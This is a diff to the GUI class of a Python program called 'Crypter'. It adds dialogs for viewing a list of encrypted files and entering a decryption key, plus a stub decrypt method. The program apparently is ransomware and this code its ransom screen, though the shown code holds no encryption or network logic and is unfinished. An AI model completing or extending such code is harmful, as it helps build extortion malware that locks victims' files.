@@ -3,6 +3,7 @@
 @summary: Crypter: GUI Class
 @author: MLS
 @version: 1.70
+@todo: Continue from Decryption dialog functionality (decrypt method)
 '''
 
 # Import libs
@@ -11,11 +12,13 @@ import os
 import time
 
 # Import Classes
-import GuiAbsBase
 import Base
+from GuiAbsBase import MainFrame
+from GuiAbsBase import ViewEncryptedFilesDialog
+from GuiAbsBase import EnterDecryptionKeyDialog
 
 # Implementing MainFrame
-class Gui( GuiAbsBase.MainFrame, Base.Base):
+class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.Base):
 	'''
 	@summary: Main GUI class. Inherits from GuiAbsBase and defines Crypter specific functions,
 	labels, text, buttons, images etc. Also inherits from main Base for schema
@@ -39,7 +42,7 @@ class Gui( GuiAbsBase.MainFrame, Base.Base):
 		self.set_message_to_null = True
 		
 		# Super
-		GuiAbsBase.MainFrame.__init__( self, parent=None )
+		MainFrame.__init__( self, parent=None )
 		
 		# Update GUI visuals
 		self.update_visuals()
@@ -61,9 +64,53 @@ class Gui( GuiAbsBase.MainFrame, Base.Base):
 		
 		# Create button events
 		# TODO Continue with implementing new dialogoues and their functionality
-		#self.Bind(wx.EVT_BUTTON, self.show_encrypted_files)
-		#self.Bind(wx.EVT_BUTTON)
+		self.Bind(wx.EVT_BUTTON, self.show_encrypted_files, self.ViewEncryptedFilesButton)
+		self.Bind(wx.EVT_BUTTON, self.show_decryption_dialog, self.EnterDecryptionKeyButton)
 		
+	
+	def show_decryption_dialog(self, event):
+		'''
+		@summary: Creates a dialog object to show the decryption dialog
+		'''
+		
+		# Create dialog object
+		decryption_dialog = EnterDecryptionKeyDialog(self)
+		
+		# Bind OK button to decryption process
+		decryption_dialog.Bind(wx.EVT_BUTTON, self.decrypt, decryption_dialog.OkCancelSizerOK)
+		decryption_dialog.Show()
+		
+		
+	
+	def decrypt(self, event):
+		'''
+		@summary: Handles the decryption process from a GUI level
+		'''
+		
+		# Check for valid key
+		print("Hello!")
+		
+		
+
+	def show_encrypted_files(self, event):
+		'''
+		@summary: Creates a dialog object showing a list of the files that were encrypted
+		'''
+		
+		# Create dialog object
+		encrypted_files_dialog = ViewEncryptedFilesDialog(self)
+
+		# If the list of encrypted files exists, load contents
+		if os.path.isfile(self.encrypted_file_list):
+			encrypted_files_dialog.EncryptedFilesTextCtrl.LoadFile(self.encrypted_file_list)
+		# Otherwise set to none found
+		else:
+			encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
+				"A list of encrypted files was not found")
+		
+		
+		encrypted_files_dialog.Show()
+
 		
 	def blink(self, event):
 		'''
